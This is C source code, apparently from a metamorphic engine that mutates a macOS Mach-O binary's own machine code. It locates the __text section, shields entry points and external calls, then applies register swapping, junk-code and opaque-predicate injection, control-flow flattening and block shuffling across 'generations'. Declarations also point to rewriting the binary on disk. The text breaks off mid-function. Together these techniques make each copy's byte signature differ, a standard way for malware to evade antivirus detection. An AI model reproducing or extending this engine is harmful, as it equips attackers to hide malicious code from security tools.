#include <aether.h>
#include <forge.h>
 
static size_t g_marker_offset = NOFFSET__;
static void clear_tx(context_t *ctx);
static bool clear_mut(context_t *ctx);
static bool reg_mut(context_t *ctx, unsigned intensity);
/* static void get_entry(const context_t *ctx);  */

static bool dsk_seg(context_t *ctx, size_t original_size);
static bool dsk_mut(context_t *ctx, const char *binary_path, uint64_t file_start, size_t original_size);

#ifndef FOO
static bool mem_mut(context_t *ctx, uint8_t *text_base, size_t text_size);
#endif

/* Get ASLR slide for this image by asking dyld */
intptr_t img_slide(const struct mach_header_64 *hdr) {
    if (!hdr) return 0;

    uint32_t img_count = _dyld_image_count();
    for (uint32_t i = 0; i < img_count; i++) {
        const struct mach_header_64 *h = (const struct mach_header_64 *)_dyld_get_image_header(i);
        if (h == hdr) {
            intptr_t slide = _dyld_get_image_vmaddr_slide(i);
            return slide;
        }
    }
    return 0;
}

/* Translate VM address to file offset */
uint64_t vmoffst(const struct mach_header_64 *hdr, uint64_t addr) {  
    if (!hdr) return NOFFSET__;

    intptr_t slide = img_slide(hdr);
    struct load_command *lc = (struct load_command *)((uint8_t *)hdr + sizeof(*hdr));

    for (uint32_t i = 0; i < hdr->ncmds; i++) {
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)lc;
            if (seg->vmsize == 0) { lc = (struct load_command *)((uint8_t *)lc + lc->cmdsize); continue; }

            uint64_t seg_start = seg->vmaddr + slide;
            uint64_t seg_end   = seg_start + seg->vmsize;

            if (addr >= seg_start && addr < seg_end) {
                uint64_t offset_into_seg = addr - seg_start;
                if (seg->fileoff > UINT64_MAX - offset_into_seg) return NOFFSET__;
                return seg->fileoff + offset_into_seg;
            }
        }
        lc = (struct load_command *)((uint8_t *)lc + lc->cmdsize);
    }
    return NOFFSET__;
}

/* Find __TEXT,__text section and fill out file/VM ranges */
bool text_sec(const struct mach_header_64 *hdr, text_section_t *out) { 
    if (!hdr || !out) return false;
    memset(out, 0, sizeof(*out));

    intptr_t slide = img_slide(hdr);
    struct load_command *lc = (struct load_command *)((uint8_t *)hdr + sizeof(*hdr));

    for (uint32_t i = 0; i < hdr->ncmds && i < 0xFFFF; i++) {
        if (!lc || lc->cmdsize == 0 || lc->cmdsize > UINT32_MAX / 2) break;

        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)lc;
            struct section_64 *sec = (struct section_64 *)((uint8_t *)seg + sizeof(*seg));

            for (uint32_t j = 0; j < seg->nsects && j < 0xFFFF; j++) {
                if (strncmp(sec[j].sectname, "__text", 16) == 0 &&
                    strncmp(sec[j].segname, "__TEXT", 16) == 0) {

                    out->file_start = sec[j].offset;
                    out->file_end   = sec[j].offset + sec[j].size;
                    out->vm_start   = sec[j].addr + slide;
                    out->vm_end     = out->vm_start + sec[j].size;
                    return true;
                }
            }
        }

        lc = (struct load_command *)((uint8_t *)lc + lc->cmdsize);
    }

    return false;
}

/* Grow buffer by doubling until it fits needed_size */
bool Ampbuff(context_t *ctx, size_t needed_size) { 
    if (!ctx) return false;
    if (needed_size <= ctx->buffcap) return true;
    if (needed_size > SIZE_MAX / 2) return false; 

    size_t new_capacity = ctx->buffcap ? ctx->buffcap : 64;
    while (new_capacity < needed_size) {
        if (new_capacity > SIZE_MAX / 2) {
            /* Can't double, try to allocate exactly what's needed */
            if (needed_size <= SIZE_MAX) {
                new_capacity = needed_size;
            } else {
                return false;
            }
            break;
        }
        new_capacity = new_capacity * 2;
    }

    uint8_t *tmp = realloc(ctx->working_code, new_capacity);
    if (!tmp) return false;

    ctx->working_code = tmp;
    ctx->buffcap = new_capacity;
    return true;
}

/* Does this look like real code? Check padding, decode ratio */
bool mach_O(const uint8_t *code, size_t size) {  
    if (!code || size < 16) return false;

    size_t zero_count = 0, ff_count = 0, valid_instructions = 0;
    size_t threshold = size * 9 / 10;
    size_t min_valid = size / 1024 + 1;

    for (size_t offset = 0; offset < size;) {
        uint8_t byte = code[offset];
        if (byte == 0x00) zero_count++;
        else if (byte == 0xFF) ff_count++;

        if (zero_count > threshold || ff_count > threshold) return false;

        size_t len = snap_len(code + offset, size - offset);
        if (!len || offset + len > size) {
            offset++;
            continue;
        }
        if (len > 0 && len <= 15 && is_op_ok(code + offset)) {
            valid_instructions++;
            offset += len;
        } else {
            offset++;
        }

        if (valid_instructions >= min_valid && offset > size / 2) return true;
    }

    return valid_instructions >= min_valid;
}

/* Mark regions we shouldn't mutate first/last quarters */
void crit_tap(struct mach_header_64 *hdr, uint64_t text_vm_start, 
             uint64_t *ranges, size_t *num_ranges, size_t codesz,
             uint8_t *code_buffer) 
{
    if (!hdr || !ranges || !num_ranges || codesz == 0) return;

    *num_ranges = 0;

    static void *hooks[] = {
        (void*)init_mut,
        (void*)boot_live,
        (void*)decode_map,
        (void*)is_chunk_ok,
        (void*)is_op_ok,
        (void*)chacha20_block,
        (void*)chacha20_random,
        (void*)chacha20_init,
        NULL
    };

    size_t num_hooks = sizeof(hooks) / sizeof(hooks[0]);

    /* Protect entry point */
    size_t entry_protect = MIN(2048, codesz / 6);
    ranges[0] = 0;
    ranges[1] = entry_protect;
    *num_ranges = 1;
    
    /* Protect last quarter for epilogue/cleanup code */
    size_t quarter = codesz / 4;
    ranges[*num_ranges * 2] = codesz - quarter;
    ranges[*num_ranges * 2 + 1] = codesz;
    (*num_ranges)++;
    
    /* Protect generation marker region if it exists */
    if (g_marker_offset != NOFFSET__ && g_marker_offset < codesz) {
        ranges[*num_ranges * 2] = g_marker_offset;
        ranges[*num_ranges * 2 + 1] = g_marker_offset + 16;  
        (*num_ranges)++;
    }

    for (size_t i = 0; i < num_hooks && *num_ranges < (_CAPZ / 2) - 100; i++) {
        if (!hooks[i]) continue;

        uint64_t addr = (uint64_t)hooks[i];
        uint64_t off  = vmoffst(hdr, addr);

        if (off == NOFFSET__ || off >= codesz) continue;

        bool covered = false;
        for (size_t j = 0; j < *num_ranges; j++) {
            uint64_t start = ranges[j*2];
            uint64_t end   = ranges[j*2+1];
            if (off >= start && off < end) { covered = true; break; }
        }
        if (covered) continue;

        size_t window = MIN(512, codesz / 20);
        uint64_t protect_start = off > window ? off - window : 0;
        uint64_t protect_end   = MIN(off + window, codesz);

        if (protect_start >= protect_end) continue;

        ranges[*num_ranges*2]     = protect_start;
        ranges[*num_ranges*2 + 1] = protect_end;
        (*num_ranges)++;
    }
    
    if (!code_buffer) {
        return;
    }
    
    uint8_t *code = code_buffer;
    size_t protected_ext = 0;
    
#if defined(__x86_64__) || defined(_M_X64)
    for (size_t i = 0; i < codesz - 5 && *num_ranges < (_CAPZ / 2); i++) {
        if (code[i] == 0xE8) {
            int32_t rel32 = *(int32_t*)(code + i + 1);
            uint64_t target = text_vm_start + i + 5 + rel32;
            
            /* 3xternal calls */
            if (target < text_vm_start || target >= text_vm_start + codesz) {
                ranges[*num_ranges*2] = i;
                ranges[*num_ranges*2 + 1] = i + 5;
                (*num_ranges)++;
                protected_ext++;
            }
            i += 4;
        }
        else if (i < codesz - 6 && code[i] == 0xFF && 
                 (code[i+1] == 0x15 || code[i+1] == 0x25)) {
            ranges[*num_ranges*2] = i;
            ranges[*num_ranges*2 + 1] = i + 6;
            (*num_ranges)++;
            protected_ext++;
            i += 5;
        }
        /* [rip+disp32] */
        else if (i < codesz - 7 && code[i] == 0x48 && 
                 (code[i+1] == 0x8D || code[i+1] == 0x8B || code[i+1] == 0x89)) {
            uint8_t modrm = code[i+2];
            if ((modrm & 0xC7) == 0x05) {
                int32_t disp32 = *(int32_t*)(code + i + 3);
                uint64_t target = text_vm_start + i + 7 + disp32;
                
                if (target < text_vm_start || target >= text_vm_start + codesz) {
                    ranges[*num_ranges*2] = i;
                    ranges[*num_ranges*2 + 1] = i + 7;
                    (*num_ranges)++;
                    protected_ext++;
                }
                i += 6;
            }
        }
    }
#elif defined(__aarch64__) || defined(_M_ARM64)
    for (size_t i = 0; i < codesz - 4 && *num_ranges < (_CAPZ / 2); i += 4) {
        uint32_t insn = *(uint32_t*)(code + i);
        
        if ((insn & 0xFC000000) == 0x94000000) {
            int32_t imm26 = (int32_t)(insn & 0x03FFFFFF);
            if (imm26 & 0x02000000) imm26 |= 0xFC000000;
            
            int64_t offset = imm26 * 4;
            uint64_t target = text_vm_start + i + offset;
            
            if (target < text_vm_start || target >= text_vm_start + codesz) {
                ranges[*num_ranges*2] = i;
                ranges[*num_ranges*2 + 1] = i + 4;
                (*num_ranges)++;
                protected_ext++;
            }
        }
        else if ((insn & 0x9F000000) == 0x90000000 && i + 8 <= codesz) {
            uint32_t next = *(uint32_t*)(code + i + 4);
            if ((next & 0xFFC00000) == 0x91000000 || 
                (next & 0xFFC00000) == 0xF9400000) {
                ranges[*num_ranges*2] = i;
                ranges[*num_ranges*2 + 1] = i + 8;
                (*num_ranges)++;
                protected_ext++;
                i += 4;
            }
        }
    }
#endif
    
    /* Merge overlapping/adjacent regions */
    if (*num_ranges > 1) {
        /* Sort regions by start address first */
        for (size_t i = 0; i < *num_ranges - 1; i++) {
            for (size_t j = i + 1; j < *num_ranges; j++) {
                if (ranges[j * 2] < ranges[i * 2]) {
                    /* Swap */
                    uint64_t tmp_start = ranges[i * 2];
                    uint64_t tmp_end = ranges[i * 2 + 1];
                    ranges[i * 2] = ranges[j * 2];
                    ranges[i * 2 + 1] = ranges[j * 2 + 1];
                    ranges[j * 2] = tmp_start;
                    ranges[j * 2 + 1] = tmp_end;
                }
            }
        }
        size_t write_idx = 0;
        for (size_t read_idx = 1; read_idx < *num_ranges; read_idx++) {
            uint64_t curr_start = ranges[read_idx * 2];
            uint64_t curr_end = ranges[read_idx * 2 + 1];
            uint64_t prev_end = ranges[write_idx * 2 + 1];

            if (curr_start <= prev_end + 1) {
                ranges[write_idx * 2 + 1] = MAX(prev_end, curr_end);
            } else {
                /* No overlap, keep as separate region */
                write_idx++;
                ranges[write_idx * 2] = curr_start;
                ranges[write_idx * 2 + 1] = curr_end;
            }
        }
        size_t original_count = *num_ranges;
        *num_ranges = write_idx + 1;
        
        DBG("[*] %zu regions (%zu external, merged from %zu)\n", 
               *num_ranges, protected_ext, original_count);
    } else {
        DBG("[*] %zu regions (%zu external)\n", *num_ranges, protected_ext);
    }
}

/* Is this offset in a protected region? */
bool chk_prot(uint64_t offset, uint64_t *ranges, size_t num_ranges) { 
    if (!ranges || num_ranges == 0) return false;
    num_ranges = MIN(num_ranges, _CAPZ);
    for (size_t i = 0; i < num_ranges; i++) {
        uint64_t start = ranges[i*2];
        uint64_t end   = ranges[i*2+1];
        if (start >= end) continue; 
        if (offset >= start && offset < end) return true;
    }
    return false;
}

/* Setup mutation context allocate buffers, seed PRNG, build CFG */
bool tx_Init(context_t *ctx, const uint8_t *code, size_t size,  
                struct mach_header_64 *hdr, uint64_t text_vm_start) {
    if (!ctx || !code || size == 0 || !hdr) return false;

    memset(ctx, 0, sizeof(*ctx));
    memset(&ctx->muttation, 0, sizeof(ctx->muttation));
    memset(&ctx->cfg, 0, sizeof(ctx->cfg));

    ctx->original_size = size;
    ctx->allowed_growth = size * 3;
    ctx->current_growth = 0;
    ctx->codesz = size;
    ctx->hdr = hdr;
    ctx->text_vm_start = text_vm_start;

    uint8_t *og = malloc(size);
    if (!og) return false;

    size_t initial_cap;
    if (size == 0) {
        initial_cap = 64;
    } else if (size > SIZE_MAX / 4) {
        initial_cap = SIZE_MAX;
    } else {
        initial_cap = size * 4;  
        if (initial_cap < 64) initial_cap = 64;
    }

    uint8_t *work = malloc(initial_cap);
    if (!work) {
        free(og);
        return false;
    }

    memcpy(og, code, size);
    memcpy(work, code, size);

    ctx->ogicode = og;
    ctx->working_code = work;
    ctx->buffcap = initial_cap;

    ctx->entry_len = MIN((size_t)SNP_SH, size);
    if (ctx->entry_len > 0) {
        memcpy(ctx->entry_backup, code, ctx->entry_len);
    } else {
        ctx->entry_len = 0;
    }

    crit_tap(hdr, text_vm_start, ctx->ranges, &ctx->numcheck, ctx->codesz, ctx->working_code);

    uint8_t seed[32];
    memset(seed, 0, sizeof(seed));
    
    uint64_t t = mach_absolute_time();
    pid_t pid = getpid();
    uuid_t uid;
    uuid_generate(uid);
    
    int urandom_fd = open("/dev/urandom", O_RDONLY);
    if (urandom_fd >= 0) {
        read(urandom_fd, seed, sizeof(seed));
        close(urandom_fd);
    }
    
    /* Avoid overwriting good entropy */
    for (size_t i = 0; i < sizeof(t) && i < sizeof(seed); i++) {
        seed[i] ^= ((uint8_t*)&t)[i];
    }
    for (size_t i = 0; i < sizeof(pid) && (i + sizeof(t)) < sizeof(seed); i++) {
        seed[i + sizeof(t)] ^= ((uint8_t*)&pid)[i];
    }
    for (size_t i = 0; i < sizeof(uid) && (i + sizeof(t) + sizeof(pid)) < sizeof(seed); i++) {
        seed[i + sizeof(t) + sizeof(pid)] ^= uid[i];
    }
    
    chacha20_init(&ctx->rng, seed, sizeof(seed));
    
    /* Clear seed from stack */
    memset(seed, 0, sizeof(seed));

    if (!init_mut(&ctx->muttation)) {
        clear_tx(ctx); 
        return false;
    }
    if (!ctx->muttation.entries) {
        clear_tx(ctx);
        return false;
    }

    if (!sketch_flow(ctx->working_code, ctx->codesz, &ctx->cfg)) {
        clear_tx(ctx);
        return false;
    }
    if (!ctx->cfg.blocks || ctx->cfg.cap_blocks == 0) {
        clear_tx(ctx);
        return false;
    }

    for (size_t i = 0; i < ctx->cfg.num_blocks; i++) {
        if (ctx->cfg.blocks[i].start >= ctx->codesz) {
            clear_tx(ctx);
            return false;
        }
    }

    DBG("size=%zu, blocks=%zu\n", ctx->codesz, ctx->cfg.num_blocks);
    
    return true;
}

static void clear_tx(context_t *ctx) {
    if (!ctx) return;
    
    free(ctx->ogicode);
    free(ctx->working_code);
    
    if (ctx->cfg.blocks) {
        free(ctx->cfg.blocks);
    }
    
    freeme(&ctx->muttation);
    memset(ctx, 0, sizeof(*ctx));
}

/* Uncomment this for a little diff in memory */
/* static void get_entry(const context_t *ctx) {
    if (!ctx || ctx->entry_len == 0 || !ctx->working_code) {
        return;
    }

    const uint8_t *orig = ctx->entry_backup;
    const uint8_t *mut = ctx->working_code;
    size_t len = ctx->entry_len;

    size_t diff = 0;
    size_t first = SIZE_MAX;

    for (size_t i = 0; i < len; i++) {
        if (orig[i] != mut[i]) {
            diff++;
            if (first == SIZE_MAX) {
                first = i;
            }
        }
    }

    if (diff == 0) {
        printf("[*] Entry diff: no changes across %zu bytes\n", len);
        return;
    }

    printf("[*] Entry diff: %zu/%zu bytes differ (first @ 0x%zx)\n", diff, len, first);

    size_t start = first;
    if (start > 8) {
        start -= 8;
    } else {
        start = 0;
    }
    size_t end = MIN(len, start + 32);

    printf("    Original: ");
    for (size_t i = start; i < end; i++) {
        printf("%02x", orig[i]);
        if (i + 1 < end) printf(" ");
    }
    printf("\n    Mutated : ");
    for (size_t i = start; i < end; i++) {
        printf("%02x", mut[i]);
        if (i + 1 < end) printf(" ");
    }
    printf("\n");
} */

/* Decode everything and check valid/invalid ratio */
static bool clear_mut(context_t *ctx) { 
    if (!ctx || !ctx->working_code || ctx->codesz == 0) return false;

    size_t instr_capacity = 8192;
    instr_info_t *instrs = malloc(instr_capacity * sizeof(instr_info_t));
    if (!instrs) return false;

    size_t ninstr = decode_map(ctx->working_code, ctx->codesz, instrs, instr_capacity);

    if (ninstr == instr_capacity) {
        free(instrs);
        instr_capacity = _ZMAX;
        instrs = malloc(instr_capacity * sizeof(instr_info_t));
        if (!instrs) return false;
        ninstr = decode_map(ctx->working_code, ctx->codesz, instrs, instr_capacity);
    }

    if (ninstr == 0) {
        free(instrs);
        return false;
    }

    size_t total_decoded = 0;
    size_t invalid_count = 0;

    for (size_t i = 0; i < ninstr; i++) {
        if (!instrs[i].valid) invalid_count++;
        else total_decoded += instrs[i].len;
    }

    free(instrs);

    size_t max_invalid = MAX(ninstr / 100, 1);
    size_t max_padding = (ctx->codesz > 50000) ? 1024 : 16;

    if (invalid_count > max_invalid) return false;
    if (total_decoded > ctx->codesz) return false;
    if ((ctx->codesz - total_decoded) > max_padding && ctx->codesz < 50000) return false;

    return true;
}

/* Register swapping + block shuffling */
static bool reg_mut(context_t *ctx, unsigned intensity) { 
    if (!ctx || !ctx->working_code || ctx->codesz == 0) return true;

    liveness_state_t liveness;
    boot_live(&liveness);

    size_t start = ctx->codesz * _BEG;
    size_t end   = ctx->codesz * _FIN;
    size_t changes = 0;
    size_t max_changes = _CAP(ctx->codesz);

    size_t offset = 0;
    size_t attempts = 0;
    size_t max_attempts = max_changes * 10;

    while (offset < ctx->codesz && changes < max_changes && attempts < max_attempts) {
        attempts++;

        x86_inst_t inst;
        if (!decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &inst, NULL) ||
            !inst.valid || inst.len == 0) {
            offset++;
            continue;
        }

        if (offset + inst.len > ctx->codesz) break;
        pulse_live(&liveness, offset, &inst);

        if (inst.has_modrm && inst.len >= 2 && inst.len <= 8 &&
            offset >= start && offset < end &&
            !chk_prot(offset, ctx->ranges, ctx->numcheck) &&
            !inst.is_control_flow && !inst.modifies_ip &&
            (chacha20_random(&ctx->rng) % 100) < (intensity * 20)) {

            uint8_t reg = (inst.modrm >> 3) & 7;
            uint8_t rm  = inst.modrm & 7;
            uint8_t mod = (inst.modrm >> 6) & 3;

            /* Only skip if DESTINATION is a stack pointer (would crash) */
            /* Allow ESP/EBP as SOURCE */
            if (mod == 3 && rm >= 4 && rm <= 5) {
                /* R/M is destination in most MOV variants skip */
                offset += inst.len;
                continue;
            }
            
            /* Only reg to reg */
            if (mod != 3) {
                offset += inst.len;
                continue;
            }

            uint8_t new_reg = jack_reg(&liveness, reg, offset, &ctx->rng);
            
            if (new_reg == reg) {
                offset += inst.len;
                continue;
            }
            
            if (inst.opcode[0] == 0x89 && new_reg >= 4 && new_reg <= 5) {
                /* skip */
                offset += inst.len;
                continue;
            }
            
            uint8_t new_modrm = (inst.modrm & 0xC7) | (new_reg << 3);
            size_t modrm_pos = 0;
            if (inst.rex) modrm_pos++;
            modrm_pos += inst.opcode_len;
            size_t modrm_offset = offset + modrm_pos;

            if (modrm_offset < ctx->codesz) {
                uint8_t backup = ctx->working_code[modrm_offset];
                ctx->working_code[modrm_offset] = new_modrm;

                /* Validate */
                x86_inst_t test_inst;
                bool valid = decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &test_inst, NULL) &&
                             test_inst.valid && 
                             !test_inst.ring0 &&  /* No privileged instructions */
                             test_inst.len == inst.len &&  /* Length must match */
                             test_inst.opcode[0] == inst.opcode[0];  /* Opcode must match */
                
                /* Only if destination isn't stackp* */
                if (valid && test_inst.has_modrm && inst.opcode[0] == 0x89) {
                    uint8_t result_rm = test_inst.modrm & 7;
                    uint8_t result_mod = (test_inst.modrm >> 6) & 3;
                    if (result_mod == 3 && (result_rm == 4 || result_rm == 5)) {
                        valid = false;  /* Would write to ESP/EBP */
                    }
                }
                
                if (!valid) {
                    ctx->working_code[modrm_offset] = backup;
                } else {
                    changes++;
                }
            }
        }

        offset += inst.len;
    }

    return changes > 0 || intensity == 0;
}

/* Inject opaque predicates at basic block boundaries */
static bool mix_opaques(context_t *ctx, unsigned intensity) {
    if (!ctx || !ctx->cfg.blocks || ctx->cfg.num_blocks < 2) return false;
    
    size_t max_injections = MIN(50, ctx->cfg.num_blocks / 10);
    if (max_injections == 0) return false;
    
    size_t max_candidates = max_injections * 3;
    size_t *off_injection = malloc(max_candidates * sizeof(size_t));
    if (!off_injection) return false;
    
    size_t num_candidates = 0;
    for (size_t i = 1; i < ctx->cfg.num_blocks && num_candidates < max_candidates; i++) {
        size_t block_start = ctx->cfg.blocks[i].start;
        
        /* Don't inject in protected regions */
        if (chk_prot(block_start, ctx->ranges, ctx->numcheck)) continue;
        
        /* Based on intensity */
        if ((chacha20_random(&ctx->rng) % 100) >= (intensity * 8)) continue;
        
        off_injection[num_candidates++] = block_start;
    }
    
    if (num_candidates > max_injections) {
        num_candidates = max_injections;
    }
    
    if (num_candidates == 0) {
        free(off_injection);
        return false;
    }
    
    /* From end to start */
    for (size_t i = 0; i < num_candidates - 1; i++) {
        for (size_t j = i + 1; j < num_candidates; j++) {
            if (off_injection[j] > off_injection[i]) {
                size_t tmp = off_injection[i];
                off_injection[i] = off_injection[j];
                off_injection[j] = tmp;
            }
        }
    }
    
    size_t injection = 0;
    for (size_t i = 0; i < num_candidates; i++) {
        size_t offset = off_injection[i];
        
        /* is offset is still valid */
        if (offset >= ctx->codesz) continue;
        
        uint8_t opaque_buf[64];
        size_t opaque_len = 0;
        uint32_t random_seed = chacha20_random(&ctx->rng);
        
#if defined(__x86_64__) || defined(_M_X64)
        forge_ghost_x86(opaque_buf, &opaque_len, random_seed, &ctx->rng);
#elif defined(__aarch64__) || defined(_M_ARM64)
        forge_ghost_arm(opaque_buf, &opaque_len, random_seed, &ctx->rng);
#else
        continue;
#endif
        if (opaque_len == 0 || opaque_len > 64) continue;
        
        /* if we have space */
        size_t needed_size = ctx->codesz + opaque_len;
        if (needed_size > ctx->buffcap) {
            if (!Ampbuff(ctx, needed_size)) break;
        }
        
        /* Verify bounds */
        if (offset + opaque_len + (ctx->codesz - offset) > ctx->buffcap) {
            break;
        }
        
        /* Make room and inject */
        memmove(ctx->working_code + offset + opaque_len,
                ctx->working_code + offset,
                ctx->codesz - offset);
        
        memcpy(ctx->working_code + offset, opaque_buf, opaque_len);
        ctx->codesz += opaque_len;
        injection++;
    }
    
    free(off_injection); 
    
    if (injection > 0) {
        DBG("[+] Got %zu \n", injection);
    }
    
    return injection > 0;
}

/* Inject junk code throughout the binary */
static bool junkify(context_t *ctx, unsigned intensity) {
    if (!ctx || !ctx->working_code || ctx->codesz == 0) return false;
    
    size_t max_injections = MIN(100, ctx->codesz / 500);
    if (max_injections == 0) return false;
    
    size_t max_candidates = max_injections * 2;
    size_t *off_injection = malloc(max_candidates * sizeof(size_t));
    if (!off_injection) return false;
    
    size_t num_candidates = 0;
    for (size_t offset = 0; offset < ctx->codesz && num_candidates < max_candidates; offset += 32) {
        if ((chacha20_random(&ctx->rng) % 100) >= (intensity * 5)) continue;
        if (chk_prot(offset, ctx->ranges, ctx->numcheck)) continue;
        
        off_injection[num_candidates++] = offset;
    }
    
    if (num_candidates > max_injections) {
        num_candidates = max_injections;
    }
    
    if (num_candidates == 0) {
        free(off_injection);
        return false;
    }
    
    for (size_t i = 0; i < num_candidates - 1; i++) {
        for (size_t j = i + 1; j < num_candidates; j++) {
            if (off_injection[j] > off_injection[i]) {
                size_t tmp = off_injection[i];
                off_injection[i] = off_injection[j];
                off_injection[j] = tmp;
            }
        }
    }
    
    size_t total_junk_len = 0;
    for (size_t i = 0; i < num_candidates; i++) {
        uint8_t junk_buf[32];
        size_t junk_len = 0;
        
#if defined(__x86_64__) || defined(_M_X64)
        spew_trash(junk_buf, &junk_len, &ctx->rng);
#elif defined(__aarch64__) || defined(_M_ARM64)
        spew_trash_arm64(junk_buf, &junk_len, &ctx->rng);
#else
        continue;
#endif
        
        if (junk_len > 0 && junk_len <= 32) {
            total_junk_len += junk_len;
        }
    }
    
    size_t needed_capacity = ctx->codesz + total_junk_len;
    if (needed_capacity > ctx->buffcap) {
        if (!Ampbuff(ctx, needed_capacity)) {
            free(off_injection);
            return false;
        }
    }
    
    size_t injection = 0;
    for (size_t i = 0; i < num_candidates; i++) {
        size_t offset = off_injection[i];
        
        if (offset >= ctx->codesz) continue;
        
        uint8_t junk_buf[32];
        size_t junk_len = 0;
        
#if defined(__x86_64__) || defined(_M_X64)
        spew_trash(junk_buf, &junk_len, &ctx->rng);
#elif defined(__aarch64__) || defined(_M_ARM64)
        spew_trash_arm64(junk_buf, &junk_len, &ctx->rng);
#else
        continue;
#endif
        
        if (junk_len == 0 || junk_len > 32) continue;
        
        /* Double-check bounds */
        if (ctx->codesz + junk_len > ctx->buffcap) {
            break;
        }
        
        if (offset + junk_len + (ctx->codesz - offset) > ctx->buffcap) {
            break;
        }
        
        /* Injection */
        memmove(ctx->working_code + offset + junk_len,
                ctx->working_code + offset,
                ctx->codesz - offset);
        
        memcpy(ctx->working_code + offset, junk_buf, junk_len);
        ctx->codesz += junk_len;
        injection++;
    }
    
    free(off_injection);
    
    if (injection > 0) {
        DBG("[+] Injected %zu \n", injection);
    }
    
    return injection > 0;
}

/* Apply control flow flattening */
static bool cflow_flatten(context_t *ctx, unsigned intensity) {
    if (!ctx || !ctx->cfg.blocks || ctx->cfg.num_blocks < 3) return false;    
    if ((chacha20_random(&ctx->rng) % 100) >= (intensity * 12)) return false;
        
    uint8_t *backup = malloc(ctx->codesz);
    if (!backup) return false;
    memcpy(backup, ctx->working_code, ctx->codesz);
    size_t backup_size = ctx->codesz;
    
    /* Apply flattening */
#if defined(__x86_64__) || defined(_M_X64)
    flatline_flow(ctx->working_code, ctx->codesz, &ctx->cfg, &ctx->rng);
#elif defined(__aarch64__) || defined(_M_ARM64)
    flatline_flow_arm64(ctx->working_code, ctx->codesz, &ctx->cfg, &ctx->rng);
#endif
    
    /* Validate */
    if (!is_chunk_ok(ctx->working_code, ctx->codesz)) {
        DBG("[!] CFG failed\n");
        memcpy(ctx->working_code, backup, backup_size);
        ctx->codesz = backup_size;
        free(backup);
        return false;
    }
    
    free(backup);
    return true;
}

/* Apply block shuffling with validation */
static bool shuffler(context_t *ctx, unsigned intensity) {
    if (!ctx || !ctx->cfg.blocks || ctx->cfg.num_blocks < 2) return false;
    
    if ((chacha20_random(&ctx->rng) % 100) >= (intensity * 10)) return false;
    
    DBG("[*] Shuffling blocks...\n");
    
    uint8_t *backup = malloc(ctx->codesz);
    if (!backup) return false;
    memcpy(backup, ctx->working_code, ctx->codesz);
    size_t backup_size = ctx->codesz;
    
    /* Apply shuffling */
#if defined(__x86_64__) || defined(_M_X64)
    shuffle_blocks(ctx->working_code, ctx->codesz, &ctx->rng); /* engine */
#elif defined(__aarch64__) || defined(_M_ARM64)
    shuffle_blocks_arm64(ctx->working_code, ctx->codesz, &ctx->rng);
#endif
    
    /* Validate */
    if (!is_chunk_ok(ctx->working_code, ctx->codesz)) {
        DBG("[!] Block shuffling failed\n");
        memcpy(ctx->working_code, backup, backup_size);
        ctx->codesz = backup_size;
        free(backup);
        return false;
    }
    
    free(backup);
    return true;
}

/* Main mutation pipeline expansion, mutations, register swaps, junk injection */
bool mOrph(context_t *ctx, unsigned generation, size_t max_size) {    
    if (!ctx || !ctx->working_code || ctx->codesz == 0) return false;

    size_t disk_limit = max_size;
    size_t memory_limit = ctx->buffcap;
    
#ifdef FOO 
    /* Disk mutations only, no expansions */
    size_t expansion_limit = 0;
    size_t growth_budget = 0;
#else
    /* Memory-only mutations with full capabilities */
    bool memory_only = true;
    size_t expansion_limit = memory_limit;
    size_t growth_budget = (expansion_limit > ctx->codesz) ? (expansion_limit - ctx->codesz) : 0;
#endif

#ifdef FOO
    if (growth_budget <= 0) {
    return reg_mut(ctx, generation);
    }
#endif

    size_t needed_capacity = ctx->codesz + growth_budget;
    if (!Ampbuff(ctx, needed_capacity)) return false;

    uint8_t *backup_code = malloc(ctx->buffcap);
    if (!backup_code) return false;
    memcpy(backup_code, ctx->working_code, ctx->codesz);
    size_t backup_sz = ctx->codesz;

    unsigned intensity = (generation == 1) ? 2 : (generation + 1);
    if (intensity > 5) intensity = 8;

    bool success = true;
    size_t size_before_expansion = ctx->codesz;

    DBG("[*] Size: %zu bytes, budget: %zu bytes\n", ctx->codesz, growth_budget);

    liveness_state_t liveness;
    boot_live(&liveness);
    size_t max_expand_size = expansion_limit;
    
#ifndef FOO
    if (generation >= 5 && ctx->codesz < max_expand_size) {
        unsigned depth = 1 + (generation / 10);
        if (depth > 3) depth = 3;
        
        DBG("[*] Chain expansion (depth=%u)...\n", depth);
        size_t new_size = expand_chains(
            ctx->working_code, ctx->codesz, max_expand_size,
            &liveness, &ctx->rng, depth, intensity * 2
        );
        
        if (new_size > ctx->codesz && new_size <= max_expand_size) {
            ctx->codesz = new_size;
            ctx->current_growth = ctx->codesz - ctx->original_size;
            DBG("[*] Chain expansion %zu -> %zu bytes\n", size_before_expansion, ctx->codesz);
        }
    }
    
    if (ctx->codesz < max_expand_size) {
        size_t new_size = expand_code(
            ctx->working_code, ctx->codesz, max_expand_size,
            &liveness, &ctx->rng, intensity * 2
        );
        
        if (new_size > ctx->codesz && new_size <= max_expand_size) {
            size_t old_size = ctx->codesz;
            ctx->codesz = new_size;
            ctx->current_growth = ctx->codesz - ctx->original_size;
        }
    }
#endif
    
    /* Rebuild CFG if code size changed */
    if (ctx->codesz != size_before_expansion) {
        if (ctx->cfg.blocks) {
            free(ctx->cfg.blocks);
            ctx->cfg.blocks = NULL;
        }
        
        DBG("[*] Rebuilding CFG ...\n");
        if (!sketch_flow(ctx->working_code, ctx->codesz, &ctx->cfg)) {
            goto rollback;
        }
        
        crit_tap(ctx->hdr, ctx->text_vm_start, ctx->ranges, &ctx->numcheck, ctx->codesz, ctx->working_code);
    }

#ifndef FOO
    if (memory_only && generation >= 4) {
        bool cfg_modified = false;
        
        /* Apply control flow flattening */
        if (generation >= 6 && ctx->cfg.num_blocks >= 5) {
            if (cflow_flatten(ctx, intensity)) {
                cfg_modified = true;
            }
        }
        
        /* Apply block shuffling */
        if (generation >= 4 && ctx->cfg.num_blocks >= 2) {
            if (shuffler(ctx, intensity)) {
                cfg_modified = true;
            }
        }
        
        /* Rebuild CFG once if modified */
        if (cfg_modified) {
            if (ctx->cfg.blocks) {
                free(ctx->cfg.blocks);
                ctx->cfg.blocks = NULL;
            }
            if (!sketch_flow(ctx->working_code, ctx->codesz, &ctx->cfg)) {
                goto rollback;
            }
        }
        
        /* Inject opaque at block boundaries */
